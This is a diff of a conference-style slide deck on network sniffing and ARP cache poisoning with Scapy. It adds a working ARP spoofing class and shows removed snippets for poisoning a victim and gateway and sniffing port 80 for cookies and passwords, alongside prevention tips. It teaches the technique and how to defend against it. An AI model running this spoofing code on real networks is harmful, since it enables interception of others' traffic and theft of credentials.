@@ -2,6 +2,16 @@ class: center, middle
 
 # Sniffing your way through the network
 
+.bottom
+---
+class: center, middle
+
+# Who am I?
+
+Software Engineer at Prismberry
+
+Like to do cool stuff with tech
+
 ---
 
 # Today we will try to answer a few basic questions about network sniffing
@@ -9,11 +19,11 @@ class: center, middle
 1. What?
 2. Why?
 3. How?
-4. When?
-5. Where?
 
 ---
-# Bit of basics
+class: middle,center
+
+# Some Basic stuff
 
 <img src="static/how_arp_works.webp" width="100%">
 
@@ -27,9 +37,10 @@ class: center, middle
 - ARP reply is used to reply to the ARP request
 
 ---
+class: middle,center
 count: false
 
-# Bit of basics
+# Some more basics
 
 <img src="http://www.tcpipguide.com/free/diagrams/arpoperation.png">
 
@@ -38,32 +49,6 @@ count: false
 # ARP cache
 - ARP cache is a table that stores the mapping of IP addresses to MAC addresses
 
----
-count: false
-
-# Bit of basics
-### Code for arp request and reply
-
-```python
-#! /usr/bin/env python3
-from scapy.all import ARP, sniff
-
-def arp_display(pkt):
-    if pkt[ARP].op == 1: #who-has (request)
-        return f"Request: {pkt[ARP].psrc} is asking about {pkt[ARP].pdst}"
-    if pkt[ARP].op == 2: #is-at (response)
-        return f"*Response: {pkt[ARP].hwsrc} has address {pkt[ARP].psrc}"
-
-sniff(prn=arp_display, filter="arp", store=0, count=10)
-```
-
----
-count: false
-
-# Bit of basics
-### Output
-
-<img src="static/arp_req_res.gif">
 
 ---
 # What?
@@ -82,73 +67,135 @@ ARP poisoning is a technique used to intercept traffic between two hosts on the 
 ---
 class: center, middle
 
-# Prerequisites
+# Requirement
+
 ```bash
 pip3 install scapy
 ```
 ---
-# Step 1: Lets Sniff the default interface
+
+# Scapy shell
+
 
 ```python
-# sniff with default interface
-from scapy.all import *
-sniff(filter="port 80", prn=process_packet, store=False)
+$ sudo scapy
+Welcome to Scapy (2.4.5)
+>>> p = IP(dst="github.com")/ICMP()
+>>> p
+<IP  frag=0 proto=icmp dst=Net('github.com') |<ICMP  |>>
+>>> r = sr1(p)
+Begin emission:
+Finished sending 1 packets.
+.*
+Received 2 packets, got 1 answers, remaining 0 packets
+>>> r
+<IP  version=4 ihl=5 tos=0x0 len=28 id=59762 flags= frag=0 ttl=57 proto=icmp
+chksum=0x7792 src=140.82.121.4 dst=217.25.178.5 |<ICMP  type=echo-reply
+code=0 chksum=0xffff id=0x0 seq=0x0 |>>
 ```
 
 ---
+# ARP request and reply
+
+```python
+#! /usr/bin/env python3
+from scapy.all import ARP, sniff
+
+def arp_display(pkt):
+    if pkt[ARP].op == 1: #who-has (request)
+        return f"Request: {pkt[ARP].psrc} is asking about {pkt[ARP].pdst}"
+    if pkt[ARP].op == 2: #is-at (response)
+        return f"*Response: {pkt[ARP].hwsrc} has address {pkt[ARP].psrc}"
+
+sniff(prn=arp_display, filter="arp", store=0, count=10)
+```
+
+---
+
+# Bit of basics
+### Output
+
+<img src="static/arp_req_res.gif">
+
+---
+
+# Sniffing with code
+
+```python
+from threading import Thread
+from scapy.all import *
+
+INTERFACE = "wlan0"
+MY_MAC_ADDRESS = get_if_hwaddr(INTERFACE)
+MY_IP_ADDRESS = get_if_addr(INTERFACE)
+
+class ARPSpoofer(AnsweringMachine):
+    def is_request(self, request):
+        return request.haslayer('ARP') and request[ARP].op == 1 and request[ARP].pdst != MY_IP_ADDRESS
+    
+    def make_reply(self, request):
+        response = Ether()/ARP()
+        response[Ether].dst = request[Ether].src
+        response[Ether].src = MY_MAC_ADDRESS
+        response[ARP].op = 2
+        response[ARP].hwsrc = MY_MAC_ADDRESS
+        response[ARP].hwdst = request[ARP].hwsrc
+        response[ARP].psrc = request[ARP].pdst
+        response[ARP].pdst = request[ARP].psrc
+        return response[ARP]
+
+arp_spoofer = Thread(target=ARPSpoofer())
+arp_spoofer.start()
+arp_spoofer.join()
+```
+
+???
+
 # How to perform ARP cache poisoning
 - We will be using scapy to perform the same
 - Scapy is a python library that allows us to send and receive packets
-- We will be using the following code to perform the same
-```python
-from scapy.all import *
-# send an ARP reply to the victim
-send(ARP(op=2, pdst="victim_ip", hwdst="victim_mac", psrc="attacker_ip"))
-# send an ARP reply to the gateway
-send(ARP(op=2, pdst="gateway_ip", hwdst="gateway_mac", psrc="attacker_ip"))
-```
 - The above code will send an ARP reply to the victim and the gateway
 - The victim will then start sending traffic to the attacker
 - Similarly, the gateway will also start sending traffic to the attacker
-- we can then sniff the traffic using the following code
-```python
-sniff(filter="port 80", prn=process_packet, store=False)
-```
-- The above code will sniff all the traffic on port 80
-- We can then perform operations on the traffic
-- Like, we can print the traffic to the console
-- or can extract the data from the traffic like cookies, passwords, etc
 
 ---
+# Output
+
+<img src="static/spoof.gif" class="center;middle" width="100%">
+
+---
+class: center, middle
+
+# What does this mean for you
+
+---
+
 # How to prevent ARP cache poisoning
+- Static ARP table
+- Restrictions on the physical network 
+- Using Smart switch
+- Encryption
+
+
+???
 - We can prevent ARP cache poisoning by monitoring the ARP cache and ARP traffic on the network.
 - We can use the following code to monitor the ARP cache
-```python
-from scapy.all import *
-# sniff for ARP packets
-sniff(filter="arp", prn=process_packet, store=False)
-```
 - The above code will sniff all the ARP packets on the network
 - We can then check if the ARP cache is poisoned or not
 - As we know, ARP cache poisoning is done by sending fake ARP replies
 - So, we can check if the ARP cache is poisoned by checking if the ARP cache has the IP address of the attacker
 - If the ARP cache has the IP address of the attacker, then the ARP cache is poisoned
-- We can then send an ARP reply to the victim and the gateway to remove the attacker from the ARP cache
-- by using the following code
-```python
-from scapy.all import *
-# send an ARP reply to the victim
-send(ARP(op=2, pdst="victim_ip", hwdst="victim_mac", psrc="gateway_ip"))
-# send an ARP reply to the gateway
-send(ARP(op=2, pdst="gateway_ip", hwdst="gateway_mac", psrc="victim_ip"))
-```
----
+- We can then send an ARP reply to the victim and the gateway to remove the attacker from the ARP cache by using the following code
 
-# Conclusion
-- We have seen how to perform ARP cache poisoning
-- We have also seen how to prevent ARP cache poisoning
-- We now know how to sniff traffic on the network
-- We can now perform operations on the traffic
+---
+class: center, middle
+
+# But this is hard to do if you are on a public network
+
+---
+class: center,middle
+
+[W47cH3R](https://github.com/EXTREMOPHILARUM/W47cH3R)
 
 ---
 class: center, middle
@@ -158,4 +205,4 @@ class: center, middle
 class: center, middle
 
 # You can find me @EXTREMOPHILARUM
-# hydpy.saurabhn.com
+# You can find the slides at hydpy.saurabhn.com
